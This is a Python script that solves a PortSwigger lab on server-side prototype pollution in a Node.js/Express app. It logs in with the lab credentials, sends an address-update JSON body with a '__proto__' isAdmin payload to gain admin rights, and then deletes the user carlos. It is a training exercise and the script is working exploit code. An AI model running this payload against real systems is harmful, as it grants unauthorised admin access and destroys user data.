'''
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:

Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
Identify a gadget property that you can use to escalate your privileges.
Access the admin panel and delete the user carlos.
You can log in to your own account with the following credentials: wiener:peter

Link: https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0a3200c603aa502183c6dc300002000a' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'csrf' : token,
            "username" : "wiener",
            "password": "peter"
    }
    r2 = s.post(uri, json=data)   

    # we can post to the change-address endpoint and change the isAdmin property of the user object
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
    
    # pollute the isAdmin property
    data = {"address_line_1":"Wiener HQ",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":s.cookies.get_dict()['session'],
            "__proto__": {
                "isAdmin":"true"
            }
        }
    r3 = s.post(uri, json=data)
    

    # now delete the carlos user
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r4 = s.get(uri)
    print('finished')


if __name__ == '__main__':
    main()